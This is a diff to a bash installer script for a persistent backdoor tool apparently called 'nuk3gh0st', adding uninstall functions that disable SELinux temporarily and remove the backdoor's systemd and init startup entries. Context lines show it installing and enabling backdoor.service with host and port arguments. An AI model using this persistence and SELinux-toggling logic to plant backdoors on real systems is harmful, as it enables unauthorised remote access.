@@ -45,14 +45,14 @@ function disable_selinux {
 }
 
 function create_systemd_service {
-	echo -e "${item} Coping nuk3gh0st.service to systemd startup scripts directory"
+	echo -e "${item} Coping backdoor.service to systemd startup scripts directory"
 	echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/backdoor.service /lib/systemd/system/backdoor.service${endColor}"
 	cp /usr/share/nuk3gh0st/backdoor.service /lib/systemd/system/backdoor.service
 	echo ""
 }
 
 function enable_systemd_service {
-	echo -e "${item} Enabling nuk3gh0st.service"
+	echo -e "${item} Enabling backdoor.service"
 	echo -e "   ${purple} cmd: systemctl enable backdoor.service${endColor}"
 	echo -n -e "${cyan}"
 	systemctl enable backdoor.service
@@ -128,6 +128,90 @@ function check_selinux_enable_startup_service {
 	fi
 }
 
+function disable_systemd_service {
+	#echo -e "${item} Stopping nuk3gh0st.service"
+	#echo -e "   ${purple} cmd: service nuk3gh0st stop${endColor}"
+	#echo -n -e "${cyan}"
+	#service nuk3gh0st stop
+	#echo -n -e "${endColor}"
+	#echo ""
+	
+	echo -e "${item} Disabling backdoor.service"
+	echo -e "   ${purple} cmd: systemctl disable backdoor.service${endColor}"
+	echo -n -e "${cyan}"
+	systemctl disable backdoor.service
+	echo -n -e "${endColor}"
+	echo ""
+}
+
+function remove_systemd_service {
+	echo -e "${item} Removing backdoor.service"
+	echo -e "   ${purple} cmd: rm /lib/systemd/system/backdoor.service${endColor}"
+	rm /lib/systemd/system/backdoor.service
+	echo ""
+}
+
+function remove_rc_symlinks {
+	echo -e "${item} Removing symbolic links of backdoor.startup for run levels from 1 to 5"
+	echo -e "   ${purple} cmd: rm /etc/rc1.d/S99backdoor.startup${endColor}"
+	rm /etc/rc1.d/S99backdoor.startup
+	echo -e "   ${purple} cmd: rm /etc/rc2.d/S99backdoor.startup${endColor}"
+	rm /etc/rc2.d/S99backdoor.startup
+	echo -e "   ${purple} cmd: rm /etc/rc3.d/S99backdoor.startup${endColor}"
+	rm /etc/rc3.d/S99backdoor.startup
+	echo -e "   ${purple} cmd: rm /etc/rc4.d/S99backdoor.startup${endColor}"
+	rm /etc/rc4.d/S99backdoor.startup
+	echo -e "   ${purple} cmd: rm /etc/rc5.d/S99backdoor.startup${endColor}"
+	rm /etc/rc5.d/S99backdoor.startup
+	echo ""
+}
+
+function remove_init_service {
+	echo -e "${item} Removing nuk3gh0st.startup from /etc/init.d/ (sysv-init startup script directory)"
+	echo -e "   ${purple} cmd: rm /etc/init.d/backdoor.startup${endColor}"
+	rm /etc/init.d/backdoor.startup
+	echo ""
+}
+
+function disable_startup_service {
+	echo -e "${item} Detecting init system..."
+	echo -n -e "${cyan}"
+	if [[ `/sbin/init --version` =~ upstart ]]; then
+		echo -n -e "${endColor}"
+		echo -e "${item} Init system is upstart"
+		remove_rc_symlinks
+		remove_init_service
+	elif [[ `systemctl` =~ -\.mount ]]; then
+		echo -n -e "${endColor}"
+		echo -e "${item} Init system is systemd"
+		disable_systemd_service
+		remove_systemd_service
+	elif [[ -f /etc/init.d/cron && ! -h /etc/init.d/cron ]]; then
+		echo -n -e "${endColor}"
+		echo -e "${item} Init system is sysv-init"
+		remove_rc_symlinks
+		remove_init_service
+	else 
+		echo -n -e "${endColor}"
+		echo -e "${item} Init system is unrecognized. Trying with sysv-init"
+		remove_rc_symlinks
+		remove_init_service
+	fi
+}
+
+function check_selinux_disable_startup_service {
+	echo -e "${item} Checking if SELINUX is enabled"
+	if [ -f /usr/sbin/semanage ]; then
+		echo -e "${item} SELINUX is enabled"
+		disable_selinux
+		disable_startup_service
+		enable_selinux
+	
+	else
+		echo -e "${item} SELINUX is disabled"
+		disable_startup_service
+	fi
+}
 
 HOST=""
 PORT=""
@@ -181,33 +265,10 @@ then
 	check_selinux_enable_startup_service
 elif [[ -z $HOST_ARG && -z $PORT_ARG && -z $SLEEP_ARG && -z $HELP_ARG && $REMOVE_ARG ]]
 then
-	remove_backdoor
+	check_selinux_disable_startup_service
 elif [[ -z $HOST_ARG && -z $PORT_ARG && -z $SLEEP_ARG && $HELP_ARG && -z $REMOVE_ARG ]]
 then
 	show_help
 else
 	echo "Está ingresando los parametros malmente"
 fi
-
-
-
-
-
-#if [ -z "$USERNAME" ]
-#then
-#    echo "El nombre de usuario es OBLIGATORIO"
-#fi
-
-#if [ -z "$SERVER" ]
-#then
-#    SERVER="servidor.por.defecto.com"
-#fi
-
-#echo "Nombre de usuario: $USERNAME"
-#echo "Servidor: $SERVER"
-#if [ -n "$VERBOSE" ]
-#then
-#    echo "El modo VERBOSE está ACTIVADO"
-#else
-#    echo "El modo VERBOSE está DESACTIVADO"
-#fi
